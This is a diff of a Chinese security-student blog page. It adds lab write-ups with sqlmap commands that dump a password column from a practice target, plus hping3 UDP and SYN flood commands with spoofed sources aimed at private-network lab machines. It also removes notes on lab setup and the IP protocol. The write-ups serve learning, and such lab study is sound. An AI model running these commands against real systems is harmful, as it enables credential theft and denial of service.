@@ -141,6 +141,251 @@
     
     
     <article
+  id="post-SQL注入练习-二"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/"
+    >SQL注入练习(二)</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/" class="article-date">
+  <time datetime="2021-04-10T15:55:37.000Z" itemprop="datePublished">2021-04-10</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>靶场：<a target="_blank" rel="noopener" href="https://rimovni.exeye.run/mefe/login">https://rimovni.exeye.run/mefe/login</a>?</p>
+<p>这时登录框的SQL注入，结合burpsuit抓包来注入</p>
+<h4 id="1-点击登录后抓到的POST数据包"><a href="#1-点击登录后抓到的POST数据包" class="headerlink" title="1.点击登录后抓到的POST数据包"></a>1.点击登录后抓到的POST数据包</h4><p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618070423895.png" alt="1618070423895"></p>
+<h4 id="2-将抓取的信息存储为search-log文件"><a href="#2-将抓取的信息存储为search-log文件" class="headerlink" title="2.将抓取的信息存储为search.log文件"></a>2.将抓取的信息存储为search.log文件</h4><p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618070511626.png" alt="1618070511626"></p>
+<h4 id="3-列数据库"><a href="#3-列数据库" class="headerlink" title="3.列数据库"></a>3.列数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r search.log --dbs</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618070703795.png" alt="1618070703795"></p>
+<h4 id="4-列数据库中的表"><a href="#4-列数据库中的表" class="headerlink" title="4.列数据库中的表"></a>4.列数据库中的表</h4><p>可以看到一个名为“ twosecu1_vuln_08”的数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r search.log -D twosecu1_vuln_08 --tables</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618070797687.png" alt="1618070797687"></p>
+<h4 id="5-列表中的字段"><a href="#5-列表中的字段" class="headerlink" title="5.列表中的字段"></a>5.列表中的字段</h4><p>可以看到这个数据库中有一张名为“user”的表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r search.log -D twosecu1_vuln_08 -T user --columns</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618070873276.png" alt="1618070873276"></p>
+<h4 id="6-列字段中的内容"><a href="#6-列字段中的内容" class="headerlink" title="6.列字段中的内容"></a>6.列字段中的内容</h4><p>直接爆password字段的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r search.log -D twosecu1_vuln_08 -T user -C password --dump</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618070965559.png" alt="1618070965559"></p>
+<p><img src="/2021/04/10/SQL%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0-%E4%BA%8C/1618071045409.png" alt="1618071045409"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-UDP-Flood安全测试"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2021/04/10/UDP-Flood%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"
+    >UDP Flood安全测试</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/04/10/UDP-Flood%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" class="article-date">
+  <time datetime="2021-04-10T14:41:02.000Z" itemprop="datePublished">2021-04-10</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h3 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h3><p>测试人员向目标发送大量的UDP数据包，就会使网络资源被耗尽。</p>
+<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>KALI  IP: 192.168.218.129</p>
+<p>KALI1 IP(被攻击): 192.168.218.128</p>
+<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>启动kaili1的apache服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# service apache2 start</span><br></pre></td></tr></table></figure>
+<p>测试指令，攻击方输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# hping3 -q -n -a 1.1.1.1 --udp -s 53 -p 80 192.168.218.128 --flood -d 1000</span><br></pre></td></tr></table></figure>
+<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>打开被攻击方的wireshark可以看到大量的UDP数据包发了过来</p>
+<p><img src="/2021/04/10/UDP-Flood%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/1618066497661.png" alt="1618066497661"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E7%94%A8-%E4%BC%A0%E8%BE%93%E5%B1%82/" rel="tag">网络安全应用(传输层)</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-TCP-SYNflooding-安全测试"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2021/04/09/TCP-SYNflooding-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"
+    >TCP SYNflooding 安全测试</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/04/09/TCP-SYNflooding-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" class="article-date">
+  <time datetime="2021-04-09T15:17:01.000Z" itemprop="datePublished">2021-04-09</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h3 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h3><p>客户端发送SYN,服务端返回SYN-ACK,如果客户端不再发送ACK,那么服务端等待超时，重新发送SYN-ACK.。如果大量的等待，就可能导致服务器崩溃。</p>
+<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>KALI  IP: 192.168.218.128 </p>
+<p>WIN 10 IP: 192.168.218.131</p>
+<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h3 id="1-在kali终端执行这条命令"><a href="#1-在kali终端执行这条命令" class="headerlink" title="1.在kali终端执行这条命令"></a>1.在kali终端执行这条命令</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -q -n --rand-source -S -p <span class="number">80</span> --flood <span class="number">192.168</span><span class="number">.218</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-win10主机抓包"><a href="#2-win10主机抓包" class="headerlink" title="2.win10主机抓包"></a>2.win10主机抓包</h3><p><em>可以看出实验好像失败了，win10回应的应该是SYN+ACK，但是回应的是RST+ACK。什么原因暂时不清楚，另外RST这个字段是什么意思还不大清楚，需要重新学习一下TCP协议。</em></p>
+<p>根据抓包可以看出，win10主机收到了大量TCP握手数据包，</p>
+<p><img src="/2021/04/09/TCP-SYNflooding-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/1617983913057.png" alt="1617983913057"></p>
+<p>3.使用流量图分析</p>
+<p><img src="/2021/04/09/TCP-SYNflooding-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/1617983152045.png" alt="1617983152045"></p>
+<p><img src="/2021/04/09/TCP-SYNflooding-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/1617984357838.png" alt="1617984357838"></p>
+<p>可以看出大量未知IP地址向192.168.218.131发起了连接，但是都没有完成第三次握手</p>
+<h2 id="实验结论"><a href="#实验结论" class="headerlink" title="实验结论"></a>实验结论</h2><p>实验貌似未成功？</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E7%94%A8-%E4%BC%A0%E8%BE%93%E5%B1%82/" rel="tag">网络安全应用(传输层)</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-高数的思维导图"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"
+    >高数的思维导图</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/" class="article-date">
+  <time datetime="2021-04-08T11:33:51.000Z" itemprop="datePublished">2021-04-08</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h3 id><a href="#" class="headerlink" title></a></h3><h2 id="极限的概念、性质与无穷小"><a href="#极限的概念、性质与无穷小" class="headerlink" title="极限的概念、性质与无穷小"></a>极限的概念、性质与无穷小</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/1%E6%9E%81%E9%99%90%E7%9A%84%E6%A6%82%E5%BF%B5%E3%80%81%E6%80%A7%E8%B4%A8%E4%B8%8E%E6%97%A0%E7%A9%B7%E5%B0%8F.png"></p>
+<h2 id="极限的计算与函数的连续性"><a href="#极限的计算与函数的连续性" class="headerlink" title="极限的计算与函数的连续性"></a>极限的计算与函数的连续性</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/2%E6%9E%81%E9%99%90%E7%9A%84%E8%AE%A1%E7%AE%97%E4%B8%8E%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%80%A7.png"></p>
+<h2 id="导数与微分"><a href="#导数与微分" class="headerlink" title="导数与微分"></a>导数与微分</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/3%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86.png"></p>
+<h2 id="微分中值定理与导数的应用"><a href="#微分中值定理与导数的应用" class="headerlink" title="微分中值定理与导数的应用"></a>微分中值定理与导数的应用</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/4%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E5%BE%8B%E4%B8%8E%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8.png"></p>
+<h2 id="不定积分"><a href="#不定积分" class="headerlink" title="不定积分"></a>不定积分</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/5%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86.png"></p>
+<h2 id="定积分与变限积分"><a href="#定积分与变限积分" class="headerlink" title="定积分与变限积分"></a>定积分与变限积分</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/6%E5%AE%9A%E7%A7%AF%E5%88%86%E4%B8%8E%E5%8F%98%E9%99%90%E7%A7%AF%E5%88%86.png"></p>
+<h2 id="反常积分与定积分的应用"><a href="#反常积分与定积分的应用" class="headerlink" title="反常积分与定积分的应用"></a>反常积分与定积分的应用</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/7%E5%8F%8D%E5%B8%B8%E7%A7%AF%E5%88%86%E4%B8%8E%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86%E7%9A%84%E5%BA%94%E7%94%A8.png"></p>
+<h2 id="微分方程"><a href="#微分方程" class="headerlink" title="微分方程"></a>微分方程</h2><p><img src="/2021/04/08/%E9%AB%98%E6%95%B0%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/8.9%E5%BE%AE%E5%88%86%E6%96%B9%E7%A8%8B-1617882484280.png"></p>
+<h2 id="多元函数微分法与极值（更新……"><a href="#多元函数微分法与极值（更新……" class="headerlink" title="多元函数微分法与极值（更新……)"></a>多元函数微分法与极值（更新……)</h2><h2 id="二重积分-更新……"><a href="#二重积分-更新……" class="headerlink" title="二重积分(更新……)"></a>二重积分(更新……)</h2> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/" rel="tag">思维导图</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
   id="post-SQL注入-扩展学习"
   class="article article-type-post"
   itemscope
@@ -153,7 +398,7 @@
        
 <h2 itemprop="name">
   <a class="article-title" href="/2021/04/03/SQL%E6%B3%A8%E5%85%A5-%E6%89%A9%E5%B1%95%E5%AD%A6%E4%B9%A0/"
-    >SQL注入-扩展学习</a> 
+    >SQL注入练习（一）</a> 
 </h2>
  
 
@@ -167,7 +412,7 @@
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="SQL注入-扩展学习"><a href="#SQL注入-扩展学习" class="headerlink" title="SQL注入-扩展学习"></a><strong>SQL注入-扩展学习</strong></h2><p>靶场<a target="_blank" rel="noopener" href="https://rimovni.exeye.run/hugkudure/hello">https://rimovni.exeye.run/hugkudure/hello</a></p>
+  <h2 id="SQL注入练习（一）"><a href="#SQL注入练习（一）" class="headerlink" title="SQL注入练习（一）"></a><strong>SQL注入练习（一）</strong></h2><p>靶场<a target="_blank" rel="noopener" href="https://rimovni.exeye.run/hugkudure/hello">https://rimovni.exeye.run/hugkudure/hello</a></p>
 <p>在成绩查询页面输入1，使用burpsuit抓包，使用的是POST方法</p>
 <p><img src="/2021/04/03/SQL%E6%B3%A8%E5%85%A5-%E6%89%A9%E5%B1%95%E5%AD%A6%E4%B9%A0/wps1.jpg" alt="img"></p>
 <p>在网上搜索了一下sqlmap注入的POST监测点方法</p>
@@ -194,6 +439,8 @@
     
     <footer class="article-footer">
        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
+
     </footer>
   </div>
 
@@ -700,498 +947,6 @@
     <footer class="article-footer">
        
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E7%94%A8-%E9%93%BE%E8%B7%AF%E5%B1%82/" rel="tag">网络安全应用(链路层)</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-环境搭建"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2021/03/15/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"
-    >环境搭建</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2021/03/15/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="article-date">
-  <time datetime="2021-03-15T15:58:31.000Z" itemprop="datePublished">2021-03-15</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h3 id="使用eNSP搭建网络协议分析实验环境"><a href="#使用eNSP搭建网络协议分析实验环境" class="headerlink" title="使用eNSP搭建网络协议分析实验环境"></a>使用eNSP搭建网络协议分析实验环境</h3><p>实验工具：eNSP、VMware Workstation Pro 、kali linux 、wireshark</p>
-<p>实验步骤：</p>
-<ol>
-<li><p>虚拟机中安装kail linux 网络模式设置位NAT模式（VM8网卡）</p>
-<p><img src="/2021/03/15/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1615824924724.png" alt="1615824924724"></p>
-</li>
-<li><p>安装eNSP</p>
-<p>在eNSP中新建网络拓扑结构，如图所示</p>
-<p><img src="/2021/03/15/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1615824988022.png" alt="1615824988022"></p>
-</li>
-<li><p>配置PC1和PC2的IP地址、子网掩码、默认网关等</p>
-<p><img src="/2021/03/15/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1615825072691.png" alt="1615825072691"></p>
-<p><img src="/2021/03/15/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1615825085258.png" alt="1615825085258"></p>
-</li>
-<li><p>配置cloud</p>
-<p><img src="/2021/03/15/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1615825117644.png" alt="1615825117644"></p>
-</li>
-<li><p>启动设备</p>
-</li>
-<li><p>检测实验</p>
-<p>使用PC1 ping kali可以ping通，并且可以抓包</p>
-<p><img src="/2021/03/15/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1615825200238.png" alt="1615825200238"></p>
-<p><img src="/2021/03/15/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1615825219452.png" alt="1615825219452"></p>
-</li>
-</ol>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-IP协议"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2021/03/11/IP%E5%8D%8F%E8%AE%AE/"
-    >IP协议</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2021/03/11/IP%E5%8D%8F%E8%AE%AE/" class="article-date">
-  <time datetime="2021-03-11T14:43:23.000Z" itemprop="datePublished">2021-03-11</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h2 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a><strong>IP协议</strong></h2><h3 id="1-IP协议基本特点"><a href="#1-IP协议基本特点" class="headerlink" title="1 IP协议基本特点"></a>1 IP协议基本特点</h3><p>不可靠、无连接。</p>
-<h3 id="2-IP数据报的格式"><a href="#2-IP数据报的格式" class="headerlink" title="2 IP数据报的格式"></a>2 IP数据报的格式</h3><p><img src="/2021/03/11/IP%E5%8D%8F%E8%AE%AE/1615473977853.png" alt="1615473977853"></p>
-<ol>
-<li><p>版本（4位）</p>
-</li>
-<li><p>首部长度（4位）</p>
-</li>
-</ol>
-<p>单位4字节</p>
-<ol start="3">
-<li>区分服务（8位）</li>
-</ol>
-<p>以前叫做服务类型，说明此IP数据报对路由器的要求，但很少使用。最后两位为ECN，由RFC 3168规定，是路由器对接收计算机的显式拥塞通告。</p>
-<ol start="4">
-<li>总长度（16位）。</li>
-</ol>
-<p>单位为字节，<strong>死亡之**</strong>ping**，ping –l命令。</p>
-<ol start="5">
-<li>标识（16位）、6.标志（3位）、7.片偏移（13位）</li>
-</ol>
-<p>这3个字段用于分片与还原。<strong>MTU</strong>（最大传输单元）：帧的数据部分长度上限。如果IP数据报超过此值，则需要分片，分片可以发生在发送计算机，也可以发生在路由器，在最终的接收机还原。</p>
-<p>分片只分数据部分。</p>
-<p>标识：每发送一个IP数据报就加1，若干分片的此字段相同，可以知道属于同一IP数据报。</p>
-<p>标志：左边一位未用，中间一位DF（1：不能分片，0：能分片），右边一位MF（1：后面还有分片，0：后面没有分片了，这是最后一片）。</p>
-<p>片偏移：指明分片在原IP数据报中的位置。单位是8字节，为什么？</p>
-<p>例子：原数据报20+3980字节。</p>
-<table>
-<thead>
-<tr>
-<th>分片</th>
-<th>数据字节数</th>
-<th>标识</th>
-<th>MF</th>
-<th>片偏移</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>1480</td>
-<td>777</td>
-<td>1</td>
-<td>0</td>
-</tr>
-<tr>
-<td>2</td>
-<td>1480</td>
-<td>777</td>
-<td>1</td>
-<td>185X8=1480</td>
-</tr>
-<tr>
-<td>3</td>
-<td>1020</td>
-<td>777</td>
-<td>0</td>
-<td>370X8=2960</td>
-</tr>
-</tbody></table>
-<p><strong>泪滴攻击。</strong></p>
-<ol start="8">
-<li>生存时间（8位）</li>
-</ol>
-<p>TTL具有不同的初值，Linux为64，Windows 10为128，Unix则为最大值255。</p>
-<ol start="9">
-<li>协议（8位）</li>
-</ol>
-<p>起分用作用，与以太网帧中的类型字段功能类似，ICMP为1，TCP为6、UDP为17。</p>
-<ol start="10">
-<li>首部检验和（16位）</li>
-</ol>
-<p>只包括首部，检验和置0，将首部划分为多个16位相加，结果取反。接收方检验和不置0，同样计算，结果为0说明正确。</p>
-<ol start="11">
-<li><p>源IP地址</p>
-</li>
-<li><p>目的IP地址</p>
-</li>
-<li><p>选项与填充</p>
-</li>
-</ol>
-<p>如果选项不是4字节的整数倍，必须填充至4字节的整数倍。</p>
-<h3 id="3-IP地址"><a href="#3-IP地址" class="headerlink" title="3 IP地址"></a>3 IP地址</h3><p>IP地址被设计为两部分：左边一部分指明该计算机所在的网络，叫做网络号，右边一部分指明该计算机，叫做主机号。网络号因为在IP地址的前边，所以也叫做前缀（prefix）。为指明计算机所在的网络，IP地址划分为网络号与主机号非常重要，无论是路由器，还是一般计算机都利用这一特性进行通信。</p>
-<p><img src="/2021/03/11/IP%E5%8D%8F%E8%AE%AE/1616163996138.png" alt="1616163996138"></p>
-<p>确定网络号与主机号的长度的方法是使用子网掩码（subnet mask）。</p>
-<p>子网掩码的长度也是32位，左边部分全是1，右边部分全是0，1的位数与网络号相同。一个IP地址总是与一个子网掩码配对出现，根据子网掩码就能确定网络号与主机号的长度了。</p>
-<p><img src="/2021/03/11/IP%E5%8D%8F%E8%AE%AE/1616164008917.png" alt="1616164008917"></p>
-<p>掩码有2种写法：255.255.255.0=/24</p>
-<p>特殊IP地址：</p>
-<ol>
-<li><p>主机号全为0与全为1的IP地址，主机号全为0代表这个网络，叫做网络IP地址，主机号全为1则是广播IP地址。主机号全为0与全为1的IP地址因为有特殊的含义，所以不能再分配给计算机。</p>
-</li>
-<li><p>范围为127.0.0.1～127.255.255.254的IP地址是环回地址，都是指本计算机，其中第1个IP地址127.0.0.1最为常用。</p>
-</li>
-<li><p>私有IP地址或专用IP地址（private IP address），分为4块：10.0.0.0～10.255.255.255、172.16.0.0～172.31.255.255、192.168.0.0～192.168.255.255、169.254.0.0～169.254.255.255。第4块169.254.0.0～169.254.255.255非常特殊，叫做自动私有IP地址，当一台计算机设置为使用DHCP协议自动获得IP地址的时候，在自动获得IP地址失败（如没有DHCP服务器）的情况下，计算机会自动为自己分配一个自动私有IP地址。与私有地址对应，那些必须申请才能使用的IP地址叫做公有IP地址或公网IP地址（public IP address）。</p>
-</li>
-</ol>
-<h3 id="4-IP数据报的转发"><a href="#4-IP数据报的转发" class="headerlink" title="4 IP数据报的转发"></a><strong>4 IP数据报的转发</strong></h3><h4 id="4-1子网"><a href="#4-1子网" class="headerlink" title="4.1子网"></a>4.1子网</h4><p>一般认为，由二层交换机连接的计算机组成一个网络，称为一个子网（网段），由路由器连接的，则不是同网络（子网、网段）。一个网络是一个广播域。</p>
-<p>同一个子网内所有计算机的网络号相同，而路由器不同接口的网络号不同，两个路由器直接相连的接口通常也组成一个网络。</p>
-<p><img src="/2021/03/11/IP%E5%8D%8F%E8%AE%AE/1616164025325.png" alt="1616164025325"></p>
-<p>IP地址为1.1.1.1/24、1.1.1.2/24与1.1.1.3/24的3台计算机都属于子网1，子网1的IP地址则是1.1.1.0/24。1.1.1.255是子网1的广播IP地址，假设计算机1.1.1.1发出目的IP地址为1.1.1.255的广播IP数据报，这些IP数据报会到达子网1内的所有计算机，但不能到达其他子网的计算机。</p>
-<p>一个问题：先用路由器连接好不同的网络，网络的物理结构就确定了，而IP地址是可以随意设置的，让一台计算机IP地址的网络号与子网内其他计算机的不同，会发生什么情况？如上图所示，子网3中的一台计算机的IP地址为4.4.4.1，与其他计算机IP地址的网络号不同，这台计算机能与其他计算机正常通信吗？路由器A与B的每个接口的IP地址都不相同，而且网络号一定要与本子网的网络号相同，如果不这样设置，路由器会无法正常工作，这又是为什么？</p>
-<h4 id="4-2-计算机发出IP数据报"><a href="#4-2-计算机发出IP数据报" class="headerlink" title="4.2 计算机发出IP数据报"></a><strong>4.2 计算机发出IP数据报</strong></h4><p>一台计算机配置IP协议属性时，需要设置IP地址、子网掩码与默认网关。有两种情况：一是发送计算机与接收计算机<strong>在同一子网内</strong>，二是发送计算机与接收计算机<strong>不在同一子网内</strong>。利用子网掩码与自己的IP地址与目的IP地址分别相“与”，就能区分这两种情况。</p>
-<p>1．发送计算机与接收计算机在同一子网内</p>
-<p>例如，计算机1.1.1.1向1.1.1.2发送一个IP数据报。1.1.1.1、1.1.1.2和子网掩码255.255.255.0与运算的结果都是1.1.1.0，这说明它们在同一个子网内。1.1.1.1在IP数据报与以太网帧的地址字段分别填写上自己与1.1.1.2的相关信息，如下图所示。这样的数据发送到网络上，就会顺利地由1.1.1.2接收处理。</p>
-<p><img src="/2021/03/11/IP%E5%8D%8F%E8%AE%AE/1616164055564.png" alt="1616164055564"></p>
-<p>同一子网计算机通信时的地址情况</p>
-<p>2．发送计算机与接收计算机不在同一子网内</p>
-<p>这种情况比较复杂，例如，计算机1.1.1.1向3.3.3.1发送一个IP数据报。1.1.1.1、3.3.3.1和子网掩码255.255.255.0与运算的结果不相同，前者是1.1.1.0，后者是3.3.3.0，这说明它们不在同一个子网内。1.1.1.1先把IP数据报发给路由器A，路由器A再转发给路由器B，最后路由器B再转发给3.3.3.1，这中间经过了两个路由器与3个子网。每经过一个路由器，该路由器的输入接口会拆封进入的帧，得到IP数据报，再转发到输出接口，输出接口则把IP数据报封装为一个新的帧，再发送出去。这样就产生了3个不同的以太网帧，各帧的地址情况如下图所示。从图中可以看出，IP数据报在传输过程中，源IP地址与目的IP地址始终不变，路由器就根据目的IP地址转发。</p>
-<p><img src="/2021/03/11/IP%E5%8D%8F%E8%AE%AE/1616164068027.png" alt="1616164068027"></p>
-<p>不同子网计算机通信时的地址情况</p>
